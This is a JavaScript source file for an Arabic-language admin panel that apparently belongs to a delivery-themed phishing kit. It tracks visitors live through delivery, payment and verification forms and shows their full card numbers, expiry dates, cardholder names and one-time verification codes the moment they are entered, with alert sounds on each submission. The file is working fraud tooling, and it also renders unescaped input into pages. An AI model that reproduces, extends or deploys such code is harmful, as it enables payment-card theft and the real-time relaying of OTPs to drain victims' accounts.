// Admin Dashboard JavaScript - Mobile First RTL
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let adminToken = localStorage.getItem('admin_token');
let isMuted = false;
let audioContext = null;

// Audio notification sounds using Web Audio API
const sounds = {
  newVisitor: () => playTone([523.25, 659.25, 783.99], 0.3),
  formDelivery: () => playTone([392, 523.25], 0.2, 0.1),
  formPayment: () => playTone([329.63, 392, 523.25, 659.25], 0.15, 0.1),
  formVerification: () => playTone([261.63, 329.63, 392, 523.25, 659.25, 783.99], 0.1, 0.1)
};

function playTone(frequencies, duration, gap = 0) {
  if (isMuted) return;
  try {
    if (!audioContext) {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
    frequencies.forEach((freq, i) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      oscillator.frequency.value = freq;
      oscillator.type = 'sine';
      const startTime = audioContext.currentTime + (gap * i);
      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
      gainNode.gain.linearRampToValueAtTime(0, startTime + duration);
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    });
  } catch (e) { console.warn('Audio not supported:', e); }
}

// Initialize Socket Connection
function initAdminSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId: 'admin_' + Date.now() },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Admin connected');
      updateConnectionStatus(true);
      if (adminToken) {
        socket.emit('admin:validate', { sessionToken: adminToken });
      }
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Admin disconnected');
      updateConnectionStatus(false);
    });

    socket.on('admin:valid', (data) => {
      if (!data.valid) {
        localStorage.removeItem('admin_token');
        adminToken = null;
      }
    });

    socket.on('admin:forceLogout', () => {
      localStorage.removeItem('admin_token');
      adminToken = null;
      showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
      setTimeout(() => showLoginPage(), 2000);
    });

    // Visitor events
    socket.on('visitor:new', (data) => {
      sounds.newVisitor();
      updateStats();
      updateVisitorsList();
    });

    socket.on('visitor:pageChange', (data) => {
      updateVisitorPage(data.sessionId, data.page);
    });

    socket.on('visitor:offline', (data) => {
      markVisitorOffline(data.sessionId);
      updateStats();
    });

    // Form submissions
    socket.on('form:deliverySubmitted', (data) => {
      sounds.formDelivery();
      updateStats();
      updateVisitorCard(data.sessionId, { form_submitted: true, delivery_data: data.formData });
    });

    socket.on('form:paymentSubmitted', (data) => {
      sounds.formPayment();
      updateStats();
      updateVisitorCard(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
    });

    socket.on('form:verificationSubmitted', (data) => {
      sounds.formVerification();
      updateStats();
      updateVisitorCard(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
    });
  });
}

function updateConnectionStatus(isOnline) {
  const dot = document.querySelector('.status-dot');
  const text = document.querySelector('.connection-text');
  if (dot) { dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`; }
  if (text) { text.textContent = isOnline ? 'متصل' : 'غير متصل'; }
}

function showNotification(title, message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.innerHTML = `
    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : 'ℹ'}</span>
    <div>
      <div style="font-weight:600;">${title}</div>
      <div style="font-size:0.85rem;color:#666;">${message}</div>
    </div>
  `;
  document.body.appendChild(notification);
  setTimeout(() => {
    notification.style.animation = 'slideDown 0.3s ease reverse';
    setTimeout(() => notification.remove(), 300);
  }, 4000);
}

// ========== MOBILE CARD RENDERING ==========
function getPageName(page) {
  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
  return pages[page] || page;
}

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode === 'XX') return '🌍';
  try {
    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
  } catch { return '🌍'; }
}

function createVisitorCard(visitor) {
  const delivery = visitor.delivery_data || {};
  const payment = visitor.payment_data || {};
  const verification = visitor.verification_data || {};
  const country = visitor.country || 'غير معروف';
  const page = visitor.current_page || 'home';
  
  const hasOTP = verification.otp || verification.verificationData?.otp;
  const otpValue = hasOTP ? (verification.otp || verification.verificationData?.otp) : null;
  
  // Progress steps
  const steps = [
    { key: 'form_submitted', label: 'التوصيل', icon: '📦' },
    { key: 'payment_submitted', label: 'الدفع', icon: '💳' },
    { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
  ];
  
  const progressHTML = steps.map(step => {
    const isCompleted = visitor[step.key];
    const isActive = !isCompleted && (
      (step.key === 'form_submitted' && !visitor.form_submitted) ||
      (step.key === 'payment_submitted' && visitor.form_submitted && !visitor.payment_submitted) ||
      (step.key === 'verification_submitted' && visitor.payment_submitted && !visitor.verification_submitted)
    );
    const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
    return `
      <div class="progress-step ${statusClass}">
        <div class="step-icon">${isCompleted ? '✓' : step.icon}</div>
        <span>${step.label}</span>
      </div>
    `;
  }).join('');
  
  // Build card sections
  let cardBody = '';
  
  // Delivery section
  if (Object.keys(delivery).length > 0) {
    cardBody += `
      <div class="card-section">
        <div class="section-title"><span>📦</span> بيانات التوصيل</div>
        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${delivery.fullName}</span></div>` : ''}
        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${delivery.phone}</span></div>` : ''}
        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${delivery.email}</span></div>` : ''}
        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${delivery.city}${delivery.region ? ' / ' + delivery.region : ''}</span></div>` : ''}
        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${delivery.address}</span></div>` : ''}
        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${delivery.notes}</span></div>` : ''}
      </div>
    `;
  }
  
  // Payment section
  if (Object.keys(payment).length > 0) {
    const cardNum = payment.cardNumber || payment.card_number || '';
    cardBody += `
      <div class="card-section payment-section">
        <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${cardNum}</span></div>` : ''}
        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${payment.cardHolder}</span></div>` : ''}
      </div>
    `;
  }
  
  // OTP section - Highlighted
  if (otpValue) {
    cardBody += `
      <div class="otp-section">
        <div class="section-title"><span>🔐</span> رمز التحقق (OTP)</div>
        <div class="otp-value">${otpValue}</div>
      </div>
    `;
  }
  
  // Empty state message
  if (!cardBody) {
    cardBody = `
      <div style="text-align:center;padding:1rem;color:#888;">
        <p>لا توجد بيانات حتى الآن</p>
        <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
      </div>
    `;
  }
  
  return `
    <div class="visitor-card" data-session="${visitor.session_id}">
      <div class="card-header">
        <div class="card-status">
          <span class="dot"></span>
          <span>متصل الآن</span>
        </div>
        <div class="card-country">
          <span>${getCountryFlag(visitor.country_code)}</span>
          <span>${country}</span>
        </div>
        <div class="card-page">${getPageName(page)}</div>
      </div>
      
      <div class="card-body">
        ${cardBody}
      </div>
      
      <div class="card-progress">
        ${progressHTML}
      </div>
      
      <div class="card-actions">
        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address}')">
          🚫 حظر
        </button>
      </div>
    </div>
  `;
}

function updateVisitorsList() {
  if (!socket) return;
  socket.emit('visitors:request');
  socket.once('visitors:update', (data) => {
    const grid = document.getElementById('visitorsGrid');
    const countEl = document.getElementById('onlineCount');
    if (!grid) return;
    
    if (countEl) {
      countEl.textContent = data.visitors.length;
    }
    
    if (data.visitors.length === 0) {
      grid.innerHTML = `
        <div class="empty-state">
          <span>👥</span>
          <h3>لا يوجد زوار متصلين</h3>
          <p>الزوار المتصلون حالياً سيظهرون هنا</p>
        </div>
      `;
      return;
    }
    
    grid.innerHTML = data.visitors.map(visitor => createVisitorCard(visitor)).join('');
  });
}

function updateVisitorPage(sessionId, page) {
  const card = document.querySelector(`[data-session="${sessionId}"]`);
  if (card) {
    const pageEl = card.querySelector('.card-page');
    if (pageEl) pageEl.textContent = getPageName(page);
    
    // Update progress steps
    const steps = card.querySelectorAll('.progress-step');
    if (page === 'delivery' && steps[0]) {
      steps[0].classList.add('active');
    }
  }
}

function updateVisitorCard(sessionId, data) {
  let card = document.querySelector(`[data-session="${sessionId}"]`);
  
  if (!card) {
    // Card doesn't exist, refresh the whole list
    updateVisitorsList();
    return;
  }
  
  // If delivery data, mark step 1 complete
  if (data.form_submitted) {
    const steps = card.querySelectorAll('.progress-step');
    if (steps[0]) {
      steps[0].classList.add('completed');
      steps[0].classList.remove('active');
      steps[0].querySelector('.step-icon').textContent = '✓';
    }
    if (steps[1]) {
      steps[1].classList.add('active');
    }
  }
  
  // If payment data, mark step 2 complete
  if (data.payment_submitted) {
    const steps = card.querySelectorAll('.progress-step');
    if (steps[1]) {
      steps[1].classList.add('completed');
      steps[1].classList.remove('active');
      steps[1].querySelector('.step-icon').textContent = '✓';
    }
    if (steps[2]) {
      steps[2].classList.add('active');
    }
  }
  
  // If verification/OTP, mark step 3 complete and highlight OTP
  if (data.verification_submitted) {
    const steps = card.querySelectorAll('.progress-step');
    if (steps[2]) {
      steps[2].classList.add('completed');
      steps[2].classList.remove('active');
      steps[2].querySelector('.step-icon').textContent = '✓';
    }
    
    // Add OTP highlight
    const verificationData = data.verification_data || data;
    if (verificationData.otp) {
      const cardBody = card.querySelector('.card-body');
      const otpSection = cardBody.querySelector('.otp-section');
      if (!otpSection) {
        cardBody.insertAdjacentHTML('beforeend', `
          <div class="otp-section">
            <div class="section-title"><span>🔐</span> رمز التحقق (OTP)</div>
            <div class="otp-value">${verificationData.otp}</div>
          </div>
        `);
      }
    }
  }
  
  // Refresh card completely for full data update
  updateVisitorsList();
}

function markVisitorOffline(sessionId) {
  const card = document.querySelector(`[data-session="${sessionId}"]`);
  if (card) {
    const statusEl = card.querySelector('.card-status');
    if (statusEl) {
      statusEl.innerHTML = '<span style="color:#aaa;">○ غير متصل</span>';
    }
    const dot = card.querySelector('.dot');
    if (dot) dot.style.background = '#ccc';
  }
}

// Stats Functions
async function updateStats() {
  if (!socket) return;
  socket.emit('stats:request');
  socket.once('stats:update', (data) => {
    const elements = {
      'totalVisitors': data.totalVisitors,
      'onlineVisitors': data.onlineVisitors,
      'formSubmissions': data.formSubmissions,
      'paymentSubmissions': data.paymentSubmissions
    };
    
    Object.entries(elements).forEach(([id, value]) => {
      const el = document.getElementById(id);
      if (el) el.textContent = value;
    });
    
    const countryList = document.getElementById('countryList');
    if (countryList && data.countryStats?.length > 0) {
      const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
      countryList.innerHTML = data.countryStats.map(country => `
        <div class="country-item">
          <span class="country-name">${country.country || 'غير معروف'}</span>
          <div class="country-bar">
            <div class="country-bar-fill" style="width: ${(parseInt(country.count) / maxCount) * 100}%"></div>
          </div>
          <span class="country-count">${country.count}</span>
        </div>
      `).join('');
    }
  });
}

// Admin Login
async function adminLogin(username, password) {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    if (data.success) {
      adminToken = data.admin.id + '_' + Date.now();
      localStorage.setItem('admin_token', adminToken);
      localStorage.setItem('admin_user', JSON.stringify(data.admin));
      if (socket) {
        socket.emit('admin:login', {
          username,
          password: '',
          deviceInfo: { userAgent: navigator.userAgent, platform: navigator.platform }
        });
      }
      return true;
    }
    return false;
  } catch (error) {
    console.error('Login error:', error);
    return false;
  }
}

// Ban Functions
function banVisitor(sessionId, ipAddress) {
  const reason = prompt('أدخل سبب الحظر:');
  if (reason === null) return;
  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):');
  
  if (socket) {
    socket.emit('user:ban', {
      targetSessionId: sessionId || null,
      targetIp: ipAddress || null,
      reason,
      customMessage: customMessage || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'
    });
    showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
    updateVisitorsList();
  }
}

// Tab Navigation
function showTab(tabId) {
  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
  document.getElementById(tabId)?.classList.add('active');
  document.querySelector(`[data-tab="${tabId}"]`)?.classList.add('active');
  
  if (tabId === 'stats') { updateStats(); }
  else if (tabId === 'tracking') { updateVisitorsList(); }
  else if (tabId === 'products') { loadProducts(); }
  else if (tabId === 'devices') { loadDevices(); }
}

// Toggle Sound
function toggleSound() {
  isMuted = !isMuted;
  const btn = document.querySelector('.sound-toggle');
  if (btn) {
    btn.classList.toggle('muted', isMuted);
    btn.textContent = isMuted ? '🔇' : '🔊';
  }
}

// Show Login/Dashboard
function showLoginPage() {
  document.getElementById('loginPage').style.display = 'flex';
  document.getElementById('dashboard').style.display = 'none';
}

function showDashboard() {
  document.getElementById('loginPage').style.display = 'none';
  document.getElementById('dashboard').style.display = 'flex';
}

// Products Functions
async function loadProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    const tbody = document.getElementById('productsTableBody');
    if (!tbody) return;
    
    if (!data.products?.length) {
      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
      return;
    }
    
    tbody.innerHTML = data.products.map(product => `
      <tr>
        <td>${product.id}</td>
        <td>${product.name_ar}</td>
        <td>${product.name_en || '-'}</td>
        <td>${product.price} ر.ع</td>
        <td>${product.stock || 0}</td>
        <td>
          <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">حذف</button>
        </td>
      </tr>
    `).join('');
  } catch (error) { console.error('Error loading products:', error); }
}

async function deleteProduct(id) {
  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
  try {
    await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
    showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
    loadProducts();
  } catch (error) { console.error('Error deleting product:', error); }
}

// Device Management
async function loadDevices() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
    const data = await response.json();
    const container = document.getElementById('devicesContainer');
    if (!container) return;
    
    if (!data.sessions?.length) {
      container.innerHTML = `<div class="empty-state"><span>📱</span><p>لا توجد أجهزة متصلة</p></div>`;
      return;
    }
    
    container.innerHTML = data.sessions.map(session => `
      <div class="device-item">
        <div class="device-info">
          <span class="device-icon">💻</span>
          <div class="device-details">
            <h4>${session.ip_address || 'غير معروف'}</h4>
            <p>${session.country || 'غير معروف'}</p>
          </div>
        </div>
        <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">خروج</button>
      </div>
    `).join('');
  } catch (error) { console.error('Error loading devices:', error); }
}

async function logoutDevice(token) {
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out device:', error); }
}

async function logoutAllDevices() {
  if (!confirm('تسجيل خروج جميع الأجهزة؟')) return;
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out devices:', error); }
}

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  await initAdminSocket();
  
  if (!adminToken) {
    showLoginPage();
  } else {
    showDashboard();
    showTab('stats');
  }
  
  // Login form
  document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const success = await adminLogin(username, password);
    if (success) {
      showDashboard();
      showTab('stats');
    } else {
      showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
    }
  });
  
  // Logout button
  document.getElementById('logoutBtn')?.addEventListener('click', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    adminToken = null;
    showLoginPage();
  });
  
  // Auto refresh tracking every second
  setInterval(() => {
    if (document.getElementById('tracking')?.classList.contains('active')) {
      updateVisitorsList();
    }
  }, 1000);
});

// Export functions
window.showTab = showTab;
window.toggleSound = toggleSound;
window.banVisitor = banVisitor;
window.deleteProduct = deleteProduct;
window.logoutDevice = logoutDevice;
window.logoutAllDevices = logoutAllDevices;
